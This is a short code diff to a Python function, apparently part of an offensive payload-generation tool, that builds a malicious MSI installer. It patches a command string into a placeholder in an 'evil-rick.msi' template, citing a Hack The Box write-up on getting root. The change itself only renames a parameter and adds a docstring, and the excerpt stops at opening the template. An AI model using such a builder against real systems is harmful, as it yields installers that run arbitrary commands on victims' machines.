@@ -14,14 +14,15 @@ logger = logging.getLogger()
 
 
 @DataTracker
-def makeMsiFromCmd(input: AceStr) -> AceBytes:
+def makeMsiFromCmd(cmd: AceStr) -> AceBytes:
+    """Return a MSI which executes cmd"""
     template = 'make/msi/evil-rick.msi' # https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root
     placeholderLen = 512
-    if len(input) > placeholderLen:
+    if len(cmd) > placeholderLen:
         raise Exception("  Input larger than {} bytes, template too small".format(placeholderLen))
 
     placeholder = b"A" * placeholderLen
-    exchange = input + (" " * (placeholderLen - len(input)))
+    exchange = cmd + (" " * (placeholderLen - len(cmd)))
     exchangeBytes = bytes(exchange, 'ascii')
 
     file = open(template, 'rb')
